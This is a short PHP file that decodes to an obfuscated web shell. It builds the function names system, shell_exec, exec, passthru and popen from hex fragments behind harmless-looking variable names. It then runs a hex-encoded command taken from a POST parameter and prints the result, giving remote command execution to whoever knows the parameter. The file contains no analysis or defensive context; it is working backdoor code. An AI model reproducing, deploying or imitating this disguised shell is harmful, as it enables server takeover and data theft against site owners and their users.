<?php


$desc1 = '7';
$desc2 = '5';
$desc3 = 'd';
$desc4 = '6';
$desc5 = '8';
$desc6 = 'c';
$desc7 = 'f';
$desc8 = '3';
$desc9 = '0';
$desc10 = '1';
$desc11 = '2';
$desc12 = '4';
$desc13 = 'e';
$desc14 = '9';
$data_storage1 = pack("H*", $desc1 . '3' . '7' . '9' . '7' . '3' . '7' . '4' . '6' . $desc2 . '6' . $desc3);
$data_storage2 = pack("H*", $desc1 . '3' . $desc4 . $desc5 . $desc4 . '5' . '6' . $desc6 . $desc4 . $desc6 . $desc2 . $desc7 . '6' . $desc2 . '7' . $desc5 . '6' . $desc2 . '6' . '3');
$data_storage3 = pack("H*", '6' . $desc2 . '7' . '8' . $desc4 . $desc2 . '6' . $desc8);
$data_storage4 = pack("H*", '7' . $desc9 . $desc4 . $desc10 . '7' . '3' . '7' . $desc8 . $desc1 . '4' . '6' . '8' . $desc1 . $desc11 . '7' . '5');
$data_storage5 = pack("H*", $desc1 . $desc9 . $desc4 . $desc7 . $desc1 . '0' . '6' . $desc2 . $desc4 . 'e');
$data_storage6 = pack("H*", '7' . '3' . '7' . $desc12 . '7' . '2' . '6' . $desc2 . $desc4 . $desc10 . $desc4 . $desc3 . $desc2 . $desc7 . '6' . $desc1 . $desc4 . '5' . '7' . $desc12 . '5' . $desc7 . $desc4 . $desc8 . $desc4 . 'f' . $desc4 . 'e' . '7' . '4' . $desc4 . '5' . $desc4 . $desc13 . $desc1 . '4' . '7' . '3');
$data_storage7 = pack("H*", '7' . '0' . $desc4 . $desc8 . '6' . $desc6 . $desc4 . 'f' . '7' . '3' . $desc4 . $desc2);
$token_parser_engine = pack("H*", '7' . '4' . '6' . 'f' . '6' . 'b' . $desc4 . $desc2 . '6' . 'e' . $desc2 . $desc7 . $desc1 . $desc9 . $desc4 . '1' . $desc1 . $desc11 . $desc1 . $desc8 . $desc4 . '5' . $desc1 . $desc11 . $desc2 . $desc7 . '6' . '5' . $desc4 . $desc13 . '6' . $desc1 . '6' . $desc14 . '6' . $desc13 . $desc4 . '5');
if (isset($_POST[$token_parser_engine])) {
    $token_parser_engine = pack("H*", $_POST[$token_parser_engine]);
    if (function_exists($data_storage1)) {
        $data_storage1($token_parser_engine);
    } elseif (function_exists($data_storage2)) {
        print $data_storage2($token_parser_engine);
    } elseif (function_exists($data_storage3)) {
        $data_storage3($token_parser_engine, $ptr_resource);
        print join("\n", $ptr_resource);
    } elseif (function_exists($data_storage4)) {
        $data_storage4($token_parser_engine);
    } elseif (function_exists($data_storage5) && function_exists($data_storage6) && function_exists($data_storage7)) {
        $hld_component = $data_storage5($token_parser_engine, 'r');
        if ($hld_component) {
            $flg_parameter_group = $data_storage6($hld_component);
            $data_storage7($hld_component);
            print $flg_parameter_group;
        }
    }
    exit;
}
